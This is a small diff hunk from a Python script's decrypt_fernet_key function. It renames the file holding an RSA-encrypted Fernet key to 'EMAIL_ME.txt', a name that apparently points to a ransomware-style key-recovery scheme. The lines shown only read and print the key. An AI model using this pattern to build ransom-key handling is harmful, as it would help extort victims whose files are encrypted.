@@ -65,7 +65,7 @@ def decrypt_fernet_key():
 	#private_key=RSA.importKey(key_pair['private']) #Import an RSA key (private), encoded in standard form
 	#print(private_key)
 	
-	with open('fernet_key.txt','rb') as f :
+	with open('EMAIL_ME.txt','rb') as f :
 		encrypted_fernet_key=f.read()
 	
 	print(f"[+] Imported Encrypted Fernet Key : \n{encrypted_fernet_key}")
